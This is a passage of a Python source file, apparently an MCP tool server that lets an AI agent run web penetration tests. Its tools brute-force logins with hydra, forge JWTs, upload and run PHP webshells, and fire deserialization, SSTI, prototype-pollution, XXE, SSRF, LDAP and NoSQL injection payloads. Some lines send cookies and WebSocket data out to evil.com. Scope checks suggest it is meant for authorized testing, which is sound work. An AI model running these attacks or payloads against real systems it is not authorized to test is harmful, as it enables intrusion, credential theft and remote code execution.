        results.append("[PYTHON] Also check: PyYAML load(), jsonpickle, shelve, marshal")

    elif platform == "nodejs":
        payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\', function(e,s){console.log(s)})}()"}'
        results.append(f"[NODE.JS - node-serialize IIFE]\n{payload}")
        results.append("[NODE.JS] Also check: serialize-to-js, cryo, funcster")

    elif platform == "ruby":
        results.append("[RUBY] Use universal-deserializer or marshal gadget chains:\n  ruby -e \"require 'base64'; puts Base64.encode64(Marshal.dump(exploit_object))\"")

    elif platform == "dotnet":
        results.append("[.NET] Use ysoserial.net:\n  ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c 'cmd /c whoami'")
        results.append("  Also try: Json.NET, XmlSerializer, DataContractSerializer, LosFormatter, SoapFormatter")

    else:
        return f"[ERROR] Unknown platform: {platform}. Use: java | php | python | nodejs | ruby | dotnet"

    log("deserialization_test", target, f"platform={platform}")
    return "\n\n".join(results)

# ─── 13. Authentication & Session ─────────────────────────────────────────────

@mcp.tool()
def auth_test(login_url: str, username: str, wordlist: str = "/usr/share/wordlists/rockyou.txt",
              user_field: str = "username", pass_field: str = "password") -> str:
    """
    Brute-force login with hydra. Detects lockout after 5 attempts.
    Also checks for: default credentials, username enumeration via response diff,
    and password reset poisoning indicators.
    """
    if not in_scope(login_url): return f"[BLOCKED] {login_url} out of scope."

    results = []

    # Username enumeration via response timing/content diff
    valid_resp   = http_post(login_url, f"{user_field}={username}&{pass_field}=wrongpassword123!")
    invalid_resp = http_post(login_url, f"{user_field}=nonexistentuser99999&{pass_field}=wrongpassword123!")

    if len(valid_resp) != len(invalid_resp):
        results.append(f"[USERNAME ENUM] Response length differs: valid={len(valid_resp)} invalid={len(invalid_resp)}")
    else:
        results.append("[OK] No obvious username enumeration via response length.")

    # Default credential check
    defaults = [("admin","admin"), ("admin","password"), ("admin","123456"),
                ("root","root"), ("test","test"), ("guest","guest")]
    for u, p in defaults:
        resp = http_post(login_url, f"{user_field}={u}&{pass_field}={p}")
        if any(sig in resp.lower() for sig in ["dashboard", "welcome", "logout", "profile"]):
            results.append(f"[DEFAULT CREDS HIT] {u}:{p}")

    # Hydra brute-force
    domain = login_url.split("/")[2]
    path   = "/" + "/".join(login_url.split("/")[3:])
    hydra  = run([
        "hydra", "-l", username, "-P", wordlist,
        domain, "http-post-form",
        f"{path}:{user_field}=^USER^&{pass_field}=^PASS^:F=incorrect",
        "-t", "4", "-f"
    ], timeout=300)
    results.append(f"[HYDRA]\n{hydra}")

    log("auth_test", login_url, f"user={username}")
    return "\n\n".join(results)

@mcp.tool()
def jwt_test(token: str, url: str = "", header: str = "Authorization") -> str:
    """
    Analyze and attack a JWT token.
    Checks: alg:none attack, weak secret brute-force, RS256->HS256 confusion,
    kid injection, jku/x5u header injection.
    """
    results = []

    # Decode without verification
    parts = token.split(".")
    if len(parts) != 3:
        return "[ERROR] Not a valid JWT (expected 3 parts)."

    def b64_decode(s):
        s += "=" * (-len(s) % 4)
        return base64.urlsafe_b64decode(s).decode(errors="replace")

    header_data  = b64_decode(parts[0])
    payload_data = b64_decode(parts[1])
    results.append(f"[HEADER]  {header_data}")
    results.append(f"[PAYLOAD] {payload_data}")

    header_json  = json.loads(header_data)
    payload_json = json.loads(payload_data)
    alg = header_json.get("alg", "")

    # alg:none attack
    none_header  = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip("=")
    none_payload = parts[1]
    none_token   = f"{none_header}.{none_payload}."
    results.append(f"[ALG:NONE] Try this token:\n{none_token}")

    # Weak secret brute-force via hashcat
    if alg.startswith("HS"):
        results.append(f"[HS BRUTE] Run:\n  hashcat -a 0 -m 16500 '{token}' /usr/share/wordlists/rockyou.txt")

    # RS256 -> HS256 confusion
    if alg == "RS256":
        results.append("[RS256->HS256] Fetch the public key, then sign with HS256 using the public key as secret:\n  python3 jwt_tool.py -X k -pk public.pem <token>")

    # kid injection
    if "kid" in header_json:
        kid_payloads = [
            "../../dev/null",
            "' UNION SELECT 'secret'--",
            "/dev/null",
        ]
        results.append(f"[KID INJECTION] kid={header_json['kid']} — try:\n" + "\n".join(kid_payloads))

    # jku / x5u injection
    for claim in ["jku", "x5u"]:
        if claim in header_json:
            results.append(f"[{claim.upper()} INJECTION] Host a malicious JWKS at your server and set {claim} to point to it.")

    log("jwt_test", url or "token-only", f"alg={alg}")
    return "\n\n".join(results)

@mcp.tool()
def session_fixation_test(url: str, login_url: str, cookies: str = "") -> str:
    """
    Test for session fixation: checks if session token changes after login.
    Also checks HttpOnly, Secure, SameSite flags on session cookies.
    """
    if not in_scope(url): return f"[BLOCKED] {url} out of scope."

    pre_login  = http_get(url)
    post_login = http_get(login_url)

    pre_cookies  = re.findall(r"Set-Cookie:\s*([^\r\n]+)", pre_login,  re.IGNORECASE)
    post_cookies = re.findall(r"Set-Cookie:\s*([^\r\n]+)", post_login, re.IGNORECASE)

    results = []
    for c in pre_cookies + post_cookies:
        flags = {
            "HttpOnly": "HttpOnly" in c,
            "Secure":   "Secure"   in c,
            "SameSite": re.search(r"SameSite=(\w+)", c),
        }
        samesite_val = flags["SameSite"].group(1) if flags["SameSite"] else "NOT SET"
        results.append(
            f"Cookie: {c[:80]}\n"
            f"  HttpOnly: {'YES' if flags['HttpOnly'] else '[MISSING]'}\n"
            f"  Secure:   {'YES' if flags['Secure']   else '[MISSING]'}\n"
            f"  SameSite: {samesite_val}"
        )

    pre_ids  = set(re.findall(r"(?:session|sess|sid|PHPSESSID|JSESSIONID)=([^;]+)", pre_login,  re.IGNORECASE))
    post_ids = set(re.findall(r"(?:session|sess|sid|PHPSESSID|JSESSIONID)=([^;]+)", post_login, re.IGNORECASE))

    if pre_ids and pre_ids == post_ids:
        results.append("[SESSION FIXATION] Session ID did not change after login.")
    elif pre_ids and post_ids:
        results.append("[OK] Session ID rotated after login.")

    log("session_fixation_test", url, "done")
    return "\n\n".join(results)

# ─── 14. Access Control / IDOR ────────────────────────────────────────────────

@mcp.tool()
def idor_test(url: str, param: str, current_id: str, cookies: str = "") -> str:
    """
    Test for IDOR by iterating IDs and comparing responses.
    Tries numeric iteration, negative values, UUIDs, array wrapping,
    and parameter pollution.
    """
    if not in_scope(url): return f"[BLOCKED] {url} out of scope."

    results = []
    base_headers = {"Cookie": cookies} if cookies else {}

    # Baseline
    baseline = http_get(f"{url}?{param}={current_id}", base_headers)
    baseline_len = len(baseline)

    test_ids = []
    try:
        n = int(current_id)
        test_ids = [str(n+1), str(n+2), str(n-1), str(n*2), "0", "-1", "99999"]
    except ValueError:
        test_ids = ["1", "2", "3", "admin", "0", "-1"]

    for test_id in test_ids:
        resp = http_get(f"{url}?{param}={test_id}", base_headers)
        code = re.search(r"HTTP/\S+\s+(\d+)", resp)
        status = code.group(1) if code else "?"
        length_diff = abs(len(resp) - baseline_len)
        if status == "200" and length_diff > 50:
            results.append(f"[POTENTIAL IDOR] id={test_id} HTTP {status} len_diff={length_diff}\n{resp[:300]}")
        else:
            results.append(f"[{status}] id={test_id} len_diff={length_diff}")

    # Array wrapping
    array_resp = http_post(url, json.dumps({param: [current_id, "1"]}),
                           headers={**base_headers, "Content-Type": "application/json"})
    results.append(f"[ARRAY WRAP] {array_resp[:200]}")

    # Param pollution
    pollution_resp = http_get(f"{url}?{param}={current_id}&{param}=1", base_headers)
    results.append(f"[PARAM POLLUTION] {pollution_resp[:200]}")

    log("idor_test", url, f"param={param} current_id={current_id}")
    return "\n\n".join(results)

@mcp.tool()
def privilege_escalation_test(url: str, low_priv_cookies: str, high_priv_cookies: str, endpoints: str = "") -> str:
    """
    Test horizontal and vertical privilege escalation.
    Replays high-privilege endpoint requests using low-privilege session.
    endpoints: comma-separated list of admin/sensitive URLs to test.
    """
    if not in_scope(url): return f"[BLOCKED] {url} out of scope."

    target_endpoints = [e.strip() for e in endpoints.split(",") if e.strip()] if endpoints else [url]
    results = []

    for ep in target_endpoints:
        high_resp = http_get(ep, {"Cookie": high_priv_cookies})
        low_resp  = http_get(ep, {"Cookie": low_priv_cookies})
        no_auth   = http_get(ep)

        high_code = re.search(r"HTTP/\S+\s+(\d+)", high_resp)
        low_code  = re.search(r"HTTP/\S+\s+(\d+)", low_resp)
        no_code   = re.search(r"HTTP/\S+\s+(\d+)", no_auth)

        h = high_code.group(1) if high_code else "?"
        l = low_code.group(1)  if low_code  else "?"
        n = no_code.group(1)   if no_code   else "?"

        if l == "200" and h == "200":
            results.append(f"[VERTICAL PRIVESC] {ep} — low-priv got 200 same as high-priv")
        if n == "200":
            results.append(f"[UNAUTH ACCESS] {ep} — accessible with no session at all")
        else:
            results.append(f"[{ep}] high={h} low={l} noauth={n}")

    log("privilege_escalation_test", url, f"{len(target_endpoints)} endpoints tested")
    return "\n\n".join(results)

# ─── 15. Business Logic ───────────────────────────────────────────────────────

@mcp.tool()
def business_logic_test(url: str, param: str, param_type: str = "price") -> str:
    """
    Test for business logic flaws in numeric parameters.
    param_type: price | quantity | discount | limit | age | step
    Tests: negative values, zero, float overflow, integer overflow,
    currency manipulation, and workflow step skipping.
    """
    if not in_scope(url): return f"[BLOCKED] {url} out of scope."

    test_values = {
        "price":    ["-1", "-0.01", "0", "0.001", "99999999", "-99999999", "1e308", "NaN", "null"],
        "quantity": ["-1", "0", "-100", "99999999", "1.5", "1e10"],
        "discount": ["101", "-1", "100.1", "99999", "0"],
        "limit":    ["-1", "0", "99999", "1e10"],
        "age":      ["-1", "0", "999", "18.5"],
        "step":     ["0", "-1", "99", "step3", "final"],
    }

    values = test_values.get(param_type, test_values["price"])
    results = []

    for val in values:
        resp = http_post(url, f"{param}={val}",
                         headers={"Content-Type": "application/x-www-form-urlencoded"})
        code = re.search(r"HTTP/\S+\s+(\d+)", resp)
        status = code.group(1) if code else "?"
        interesting = any(sig in resp.lower() for sig in ["success", "order", "confirm", "payment", "thank"])
        tag = "[LOGIC HIT]" if interesting and val in ["-1", "-0.01", "0", "-100"] else f"[HTTP {status}]"
        results.append(f"{tag} {param}={val}\n{resp[:200]}")

    log("business_logic_test", url, f"param={param} type={param_type}")
    return "\n\n".join(results)

# ─── 16. File Upload ──────────────────────────────────────────────────────────

@mcp.tool()
def file_upload_test(url: str, file_param: str = "file", cookies: str = "") -> str:
    """
    Test file upload endpoints for unrestricted upload vulnerabilities.
    Attempts: PHP webshell, polyglot (GIF+PHP), MIME type bypass,
    double extension, null byte, and path traversal in filename.
    """
    if not in_scope(url): return f"[BLOCKED] {url} out of scope."

    results = []
    base_headers = {"Cookie": cookies} if cookies else {}

    # Create test files in workspace
    webshell_php  = WORKSPACE / "shell.php"
    webshell_phtml = WORKSPACE / "shell.phtml"
    polyglot      = WORKSPACE / "polyglot.php.gif"
    jpg_shell     = WORKSPACE / "shell.jpg"

    webshell_php.write_text("<?php system($_GET['cmd']); ?>")
    webshell_phtml.write_text("<?php system($_GET['cmd']); ?>")
    polyglot.write_bytes(b"GIF89a" + b"<?php system($_GET['cmd']); ?>")
    jpg_shell.write_bytes(b"\xff\xd8\xff\xe0" + b"<?php system($_GET['cmd']); ?>")

    upload_tests = [
        (str(webshell_php),   "shell.php",          "application/x-php"),
        (str(webshell_phtml), "shell.phtml",         "application/x-php"),
        (str(polyglot),       "polyglot.php.gif",    "image/gif"),
        (str(jpg_shell),      "shell.php%00.jpg",    "image/jpeg"),
        (str(jpg_shell),      "shell.php5",          "image/jpeg"),
        (str(jpg_shell),      "../shell.php",        "image/jpeg"),
        (str(webshell_php),   "shell.PHP",           "application/x-php"),
    ]

    for filepath, filename, mime in upload_tests:
        resp = run([
            "curl", "-sk", "-i",
            "-F", f"{file_param}=@{filepath};filename={filename};type={mime}",
            *(["-H", f"Cookie: {cookies}"] if cookies else []),
            url
        ], timeout=30)
        code = re.search(r"HTTP/\S+\s+(\d+)", resp)
        status = code.group(1) if code else "?"
        uploaded_url = re.search(r"(?:url|path|location|src)[\"'\s:]+([^\s\"']+\.(?:php|phtml|php5|gif|jpg))", resp, re.IGNORECASE)
        tag = "[UPLOADED]" if status in ["200", "201"] else f"[HTTP {status}]"
        results.append(f"{tag} filename={filename} mime={mime}")

        # If upload succeeded, try to execute the webshell
        if uploaded_url and status in ["200", "201"]:
            shell_url = uploaded_url.group(1)
            if not shell_url.startswith("http"):
                base = "/".join(url.split("/")[:3])
                shell_url = base + "/" + shell_url.lstrip("/")
            exec_resp = http_get(f"{shell_url}?cmd=id")
            if re.search(r"uid=\d+|root|www-data", exec_resp):
                results.append(f"  [RCE CONFIRMED] Shell at: {shell_url}?cmd=id\n  Output: {exec_resp[:200]}")
            else:
                results.append(f"  [SHELL URL] {shell_url} — test manually")

    log("file_upload_test", url, f"{len(results)} upload attempts")
    return "\n\n".join(results)

# ─── 17. OAuth 2.0 ───────────────────────────────────────────────────────────

@mcp.tool()
def oauth_test(authorization_url: str, redirect_uri: str, client_id: str, cookies: str = "") -> str:
    """
    Test OAuth 2.0 implementation for common vulnerabilities.
    Checks: state parameter validation, redirect_uri bypass, response_type abuse,
    token leakage via Referer, open redirect chaining, and PKCE bypass.
    """
    if not in_scope(authorization_url): return f"[BLOCKED] {authorization_url} out of scope."

    results = []
    base_headers = {"Cookie": cookies} if cookies else {}

    # 1. Missing state parameter (CSRF on OAuth flow)
    no_state_url = f"{authorization_url}?client_id={client_id}&redirect_uri={redirect_uri}&response_type=code"
    resp = http_get(no_state_url, base_headers)
    if "error" not in resp.lower() and "state" not in resp.lower():
        results.append("[CSRF] No state parameter required — OAuth flow is CSRF-able.")
    else:
        results.append("[OK] state parameter appears enforced.")

    # 2. redirect_uri bypass attempts
    bypass_uris = [
        redirect_uri + ".evil.com",
        redirect_uri + "@evil.com",
        redirect_uri.replace("https://", "https://evil.com/"),
        "https://evil.com",
        redirect_uri + "/../../evil",
        redirect_uri.rstrip("/") + "%2F%2Fevil.com",
    ]
    for uri in bypass_uris:
        test_url = f"{authorization_url}?client_id={client_id}&redirect_uri={urllib.parse.quote(uri)}&response_type=code&state=test123"
        resp = http_get(test_url, base_headers)
        if "evil.com" in resp or (re.search(r"HTTP/\S+\s+30[12]", resp) and "evil" in resp):
            results.append(f"[REDIRECT_URI BYPASS] {uri}")
        else:
            results.append(f"[MISS] redirect_uri={uri}")

    # 3. response_type=token (implicit flow — token in URL fragment)
    implicit_url = f"{authorization_url}?client_id={client_id}&redirect_uri={redirect_uri}&response_type=token&state=test123"
    resp = http_get(implicit_url, base_headers)
    if "access_token" in resp:
        results.append(f"[IMPLICIT FLOW] access_token exposed in response — token leakage via Referer possible.")

    # 4. Scope escalation
    scope_url = f"{authorization_url}?client_id={client_id}&redirect_uri={redirect_uri}&response_type=code&state=test123&scope=admin+openid+profile+email"
    resp = http_get(scope_url, base_headers)
    results.append(f"[SCOPE ESCALATION ATTEMPT]\n{resp[:300]}")

    log("oauth_test", authorization_url, f"client_id={client_id}")
    return "\n\n".join(results)

# ─── 18. WebSockets ───────────────────────────────────────────────────────────

@mcp.tool()
def websocket_test(ws_url: str, message: str = '{"action":"ping"}', cookies: str = "") -> str:
    """
    Test WebSocket endpoint for security issues.
    Checks: cross-site WebSocket hijacking (CSWSH), injection via message payload,
    origin validation, and authentication bypass.
    Uses websocat if available.
    """
    if not in_scope(ws_url): return f"[BLOCKED] {ws_url} out of scope."

    results = []
    websocat = run(["which", "websocat"]).strip()

    if not websocat or "[ERROR]" in websocat:
        results.append("[INFO] websocat not found. Install: cargo install websocat")
    else:
        # Send message with no Origin (auth bypass check)
        resp = run(["websocat", "--no-close", "-1", ws_url, "<<<", message], timeout=15)
        results.append(f"[NO ORIGIN] Response:\n{resp[:300]}")

        # Send with evil Origin (CSWSH check)
        resp_evil = run([
            "websocat", "--no-close", "-1",
            "--header", "Origin: https://evil.com",
            ws_url, "<<<", message
        ], timeout=15)
        results.append(f"[EVIL ORIGIN] Response:\n{resp_evil[:300]}")

    # Injection payloads via message body
    injection_payloads = [
        '{"action":"ping","data":"<script>alert(1)</script>"}',
        '{"action":"ping","data":"\'OR 1=1--"}',
        '{"action":"../admin","data":"test"}',
        '{"action":"ping","userId":"../../../etc/passwd"}',
        '{"__proto__":{"polluted":"yes"}}',
    ]

    results.append("[INJECTION PAYLOADS TO TEST MANUALLY VIA BURP]")
    for p in injection_payloads:
        results.append(f"  {p}")

    # CSWSH PoC
    poc = f"""<!DOCTYPE html>
<html><body>
<script>
  var ws = new WebSocket('{ws_url}');
  ws.onopen = function() {{
    ws.send('{message}');
  }};
  ws.onmessage = function(e) {{
    fetch('https://evil.com/log?data=' + encodeURIComponent(e.data));
  }};
</script>
</body></html>"""
    poc_file = WORKSPACE / "cswsh_poc.html"
    poc_file.write_text(poc)
    results.append(f"[CSWSH PoC] Saved to {poc_file}")

    log("websocket_test", ws_url, "done")
    return "\n\n".join(results)

# ─── 19. GraphQL ──────────────────────────────────────────────────────────────

@mcp.tool()
def graphql_test(url: str, cookies: str = "") -> str:
    """
    Test GraphQL endpoint for common vulnerabilities.
    Checks: introspection enabled, batching attacks, field suggestions,
    IDOR via direct object queries, DoS via deeply nested queries,
    and injection via query arguments.
    """
    if not in_scope(url): return f"[BLOCKED] {url} out of scope."

    results = []
    base_headers = {
        "Content-Type": "application/json",
        **({"Cookie": cookies} if cookies else {})
    }

    # 1. Introspection
    introspection_query = json.dumps({
        "query": "{ __schema { types { name fields { name } } } }"
    })
    resp = http_post(url, introspection_query, base_headers)
    if "__schema" in resp:
        results.append(f"[INTROSPECTION ENABLED] Schema exposed:\n{resp[:600]}")
    else:
        results.append("[OK] Introspection appears disabled.")

    # 2. Field suggestions (schema leakage even without introspection)
    suggestion_query = json.dumps({"query": "{ usr { id } }"})
    resp = http_post(url, suggestion_query, base_headers)
    if "Did you mean" in resp or "suggestion" in resp.lower():
        results.append(f"[FIELD SUGGESTION LEAK] {resp[:300]}")

    # 3. Batch query attack (rate limit / auth bypass)
    batch = json.dumps([
        {"query": f'{{ user(id: {i}) {{ id email password }} }}'}
        for i in range(1, 11)
    ])
    resp = http_post(url, batch, base_headers)
    results.append(f"[BATCH QUERY]\n{resp[:400]}")

    # 4. Deeply nested query (DoS)
    nested = "{ user { friends { friends { friends { friends { friends { id } } } } } } }"
    resp = http_post(url, json.dumps({"query": nested}), base_headers)
    results.append(f"[NESTED QUERY DoS attempt]\n{resp[:200]}")

    # 5. Injection via argument
    sqli_query = json.dumps({"query": "{ user(id: \"1 OR 1=1\") { id email } }"})
    resp = http_post(url, sqli_query, base_headers)
    results.append(f"[SQLI IN ARGUMENT]\n{resp[:200]}")

    # 6. Mutation enumeration
    mutation_query = json.dumps({"query": "{ __schema { mutationType { fields { name args { name } } } } }"})
    resp = http_post(url, mutation_query, base_headers)
    results.append(f"[MUTATIONS]\n{resp[:400]}")

    log("graphql_test", url, "done")
    return "\n\n".join(results)

# ─── 20. Prototype Pollution ──────────────────────────────────────────────────

@mcp.tool()
def prototype_pollution_test(url: str, cookies: str = "") -> str:
    """
    Test for JavaScript prototype pollution (client-side and server-side).
    Sends payloads via query string, JSON body, and URL fragments.
    Checks for reflected pollution indicators and server-side Node.js impact.
    """
    if not in_scope(url): return f"[BLOCKED] {url} out of scope."

    results = []
    base_headers = {"Cookie": cookies} if cookies else {}

    # Query string payloads
    qs_payloads = [
        "__proto__[polluted]=1",
        "constructor[prototype][polluted]=1",
        "__proto__.polluted=1",
        "a[__proto__][polluted]=1",
    ]
    for p in qs_payloads:
        resp = http_get(f"{url}?{p}", base_headers)
        if "polluted" in resp:
            results.append(f"[QS HIT] {p}\n{resp[:200]}")
        else:
            results.append(f"[MISS] {p}")

    # JSON body payloads (server-side Node.js)
    json_payloads = [
        {"__proto__": {"polluted": True}},
        {"constructor": {"prototype": {"polluted": True}}},
        {"__proto__": {"isAdmin": True}},
        {"__proto__": {"outputFunctionName": "_x;process.mainModule.require('child_process').execSync('id');//"}},
    ]
    for p in json_payloads:
        resp = http_post(url, json.dumps(p),
                         headers={**base_headers, "Content-Type": "application/json"})
        if "polluted" in resp or re.search(r"uid=\d+", resp):
            results.append(f"[JSON HIT] {json.dumps(p)}\n{resp[:200]}")
        else:
            results.append(f"[MISS JSON] {json.dumps(p)[:60]}")

    results.append("\n[CLIENT-SIDE] Test in browser console:\n"
                   "  Object.prototype.polluted = 1;\n"
                   "  Check if app behaviour changes (hidden fields, bypassed checks).\n"
                   "  Tools: PPScan (Chrome extension), DOM Invader (Burp)")

    log("prototype_pollution_test", url, "done")
    return "\n\n".join(results)

# ─── 21. Host Header Injection ────────────────────────────────────────────────

@mcp.tool()
def host_header_injection_test(url: str, callback_host: str = "") -> str:
    """
    Test for Host header injection vulnerabilities.
    Covers: password reset poisoning, cache poisoning, SSRF via Host,
    routing-based SSRF, and ambiguous Host headers.
    """
    if not in_scope(url): return f"[BLOCKED] {url} out of scope."

    results = []
    evil = callback_host or "evil.com"

    test_headers = [
        {"Host": evil},
        {"Host": f"{evil}:80"},
        {"Host": url.split("/")[2], "X-Forwarded-Host": evil},
        {"Host": url.split("/")[2], "X-Host": evil},
        {"Host": url.split("/")[2], "X-Forwarded-Server": evil},
        {"Host": url.split("/")[2], "X-HTTP-Host-Override": evil},
        {"Host": url.split("/")[2], "Forwarded": f"host={evil}"},
        # Ambiguous / duplicate Host
        {"Host": f"{url.split('/')[2]}, {evil}"},
    ]

    for headers in test_headers:
        resp = http_get(url, headers)
        if evil in resp:
            results.append(f"[HIT] Headers: {headers}\nResponse contains '{evil}':\n{resp[:300]}")
        else:
            code = re.search(r"HTTP/\S+\s+(\d+)", resp)
            results.append(f"[HTTP {code.group(1) if code else '?'}] {headers}")

    if callback_host:
        results.append(f"\n[OOB] Check {callback_host} for DNS/HTTP callbacks from password reset or cache poisoning.")

    log("host_header_injection_test", url, f"evil={evil}")
    return "\n\n".join(results)

# ─── 22. HTTP Response Splitting / Header Injection ───────────────────────────

@mcp.tool()
def header_injection_test(url: str, param: str) -> str:
    """
    Test for HTTP response splitting and header injection.
    Injects CRLF sequences into a parameter and checks if they appear in response headers.
    """
    if not in_scope(url): return f"[BLOCKED] {url} out of scope."

    payloads = [
        "%0d%0aX-Injected: header",
        "%0aX-Injected: header",
        "\r\nX-Injected: header",
        "%0d%0aSet-Cookie: injected=1",
        "%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>",
        "foo%0d%0aLocation: https://evil.com",
    ]

    results = []
    for p in payloads:
        resp = http_get(f"{url}?{param}={p}")
        if "X-Injected" in resp or "injected=1" in resp or "Location: https://evil.com" in resp:
            results.append(f"[HIT] {p}\n{resp[:300]}")
        else:
            results.append(f"[MISS] {p}")

    log("header_injection_test", url, f"param={param}")
    return "\n\n".join(results)

# ─── 23. Cache Poisoning ──────────────────────────────────────────────────────

@mcp.tool()
def cache_poisoning_test(url: str, callback_host: str = "") -> str:
    """
    Test for web cache poisoning via unkeyed headers and parameters.
    Checks: X-Forwarded-Host, X-Original-URL, X-Rewrite-URL,
    unkeyed query params, fat GET, and cache deception.
    """
    if not in_scope(url): return f"[BLOCKED] {url} out of scope."

    results = []
    evil = callback_host or "evil.com"

    # Unkeyed header injection
    unkeyed_headers = [
        {"X-Forwarded-Host": evil},
        {"X-Forwarded-Scheme": "https", "X-Forwarded-Host": evil},
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
        {"X-Forwarded-Prefix": f"//{evil}"},
        {"X-Forwarded-For": evil},
    ]

    for headers in unkeyed_headers:
        resp = http_get(url, headers)
        if evil in resp or "admin" in resp.lower():
            results.append(f"[CACHE POISON HIT] Headers: {headers}\n{resp[:300]}")
        else:
            code = re.search(r"HTTP/\S+\s+(\d+)", resp)
            results.append(f"[HTTP {code.group(1) if code else '?'}] {headers}")

    # Fat GET (body in GET request)
    fat_get = run([
        "curl", "-sk", "-i", "-X", "GET",
        "-d", f"param=injected_{evil}",
        "-H", "Content-Type: application/x-www-form-urlencoded",
        url
    ], timeout=15)
    results.append(f"[FAT GET]\n{fat_get[:300]}")

    # Cache deception — append static extension to sensitive path
    deception_urls = [
        url + "/profile.css",
        url + "/account.js",
        url + "/settings.png",
        url + ";.js",
        url + "?.css",
    ]
    for du in deception_urls:
        resp = http_get(du)
        cache_hit = re.search(r"(?:X-Cache|CF-Cache-Status|Age):\s*(.+)", resp, re.IGNORECASE)
        if cache_hit:
            results.append(f"[CACHE DECEPTION] {du}\nCache header: {cache_hit.group()}")

    log("cache_poisoning_test", url, f"evil={evil}")
    return "\n\n".join(results)

# ─── 24. LDAP Injection ───────────────────────────────────────────────────────

@mcp.tool()
def ldap_injection_test(url: str, param: str) -> str:
    """
    Test for LDAP injection in search/authentication parameters.
    Covers authentication bypass and blind LDAP enumeration payloads.
    """
    if not in_scope(url): return f"[BLOCKED] {url} out of scope."

    payloads = [
        # Auth bypass
        "*",
        "*)(&",
        "*)(uid=*))(|(uid=*",
        "admin)(&(password=*))",
        "*()|%26'",
        "admin)(!(&(1=0)))",
        # Blind enumeration
        "*(|(objectclass=*))",
        "admin)(|(cn=*",
        "x)(cn=*",
    ]

    results = []
    baseline = http_get(f"{url}?{param}=normaluser")

    for p in payloads:
        resp = http_get(f"{url}?{param}={urllib.parse.quote(p)}")
        if len(resp) != len(baseline) or any(
            sig in resp.lower() for sig in ["welcome", "dashboard", "logged in", "success"]
        ):
            results.append(f"[HIT] {p}\n{resp[:300]}")
        else:
            results.append(f"[MISS] {p}")

    log("ldap_injection_test", url, f"param={param}")
    return "\n\n".join(results)

# ─── 25. NoSQL Injection ──────────────────────────────────────────────────────

@mcp.tool()
def nosql_injection_test(url: str, param: str, method: str = "GET") -> str:
    """
    Test for NoSQL injection (MongoDB-focused).
    Covers: operator injection, JSON body injection, auth bypass,
    blind boolean-based enumeration, and JS injection ($where).
    """
    if not in_scope(url): return f"[BLOCKED] {url} out of scope."

    results = []

    # Query string operator injection
    qs_payloads = [
        f"{param}[$ne]=invalid",
        f"{param}[$gt]=",
        f"{param}[$regex]=.*",
        f"{param}[$where]=1==1",
        f"{param}[$exists]=true",
    ]
    for p in qs_payloads:
        resp = http_get(f"{url}?{p}")
        if any(sig in resp.lower() for sig in ["welcome", "success", "dashboard", "token", "user"]):
            results.append(f"[HIT QS] {p}\n{resp[:300]}")
        else:
            results.append(f"[MISS] {p}")

    # JSON body injection
    json_payloads = [
        {param: {"$ne": None}},
        {param: {"$gt": ""}},
        {param: {"$regex": ".*"}},
        {param: {"$where": "this.password.length > 0"}},
        {"username": "admin", "password": {"$ne": "invalid"}},
    ]
    for p in json_payloads:
        resp = http_post(url, json.dumps(p),
                         headers={"Content-Type": "application/json"})
        if any(sig in resp.lower() for sig in ["welcome", "success", "token", "dashboard"]):
            results.append(f"[HIT JSON] {json.dumps(p)}\n{resp[:300]}")
        else:
            results.append(f"[MISS JSON] {json.dumps(p)[:60]}")

    log("nosql_injection_test", url, f"param={param}")
    return "\n\n".join(results)

# ─── Exploitation Assistance ──────────────────────────────────────────────────

@mcp.tool()
def generate_payload(vuln_type: str, context: str) -> str:
    """
    Generate targeted exploitation payloads.
    vuln_type: sqli | xss | xxe | ssti | rce | lfi | ssrf | idor |
               deserialize | csrf | cors | smuggling | prototype | graphql
    context: tech stack, WAF, encoding constraints.
    """
    payloads = {
        "sqli": [
            "' OR 1=1--", "' OR '1'='1", "1; SELECT sleep(5)--",
            "' UNION SELECT null,null,null--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        ],
        "xss": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "\"><script>fetch('https://evil.com?c='+document.cookie)</script>",
            "<details open ontoggle=alert(1)>",
        ],
        "xxe": [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
        ],
        "ssti": [
            "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
            "{{config}}", "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        ],
        "rce": ["; id", "| id", "`id`", "$(id)", "%0aid"],
        "lfi": [
            "../../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index",
            "/proc/self/environ",
        ],
        "ssrf": [
            "http://169.254.169.254/latest/meta-data/",
            "http://[::1]/admin",
            "dict://localhost:11211/",
            "gopher://localhost:6379/_INFO",
        ],
        "idor": [
            "Increment/decrement numeric ID",
            "Wrap in array: {id:1} -> {id:[1,2]}",
            "Parameter pollution: id=1&id=2",
            "Try negative and zero values",
        ],
        "deserialize": [
            "Java: ysoserial CommonsCollections1-7",
            "PHP: phpggc gadget chains",
            "Python: pickle RCE via __reduce__",
            "Node.js: node-serialize IIFE injection",
        ],
        "csrf": [
            "Remove CSRF token entirely",
            "Use token from another session",
            "Change POST to GET",
            "Submit empty token value",
            "JSON CSRF with text/plain Content-Type",
        ],
        "cors": [
            "Origin: https://evil.com (check ACAO reflection)",
            "Origin: null (sandbox iframe)",
            "Origin: https://evil.target.com (subdomain trust)",
        ],
        "smuggling": [
            "CL.TE: Content-Length + chunked Transfer-Encoding",
            "TE.CL: chunked TE + short Content-Length",
            "TE.TE: obfuscated Transfer-Encoding header",
        ],
        "prototype": [
            "__proto__[isAdmin]=true",
            "constructor.prototype.isAdmin=true",
            "__proto__[outputFunctionName]=_x;process.mainModule.require('child_process').execSync('id');//",
        ],
        "graphql": [
            "Introspection: {__schema{types{name}}}",
            "Batch: [{query:'...'},{query:'...'}]",
            "Deeply nested query for DoS",
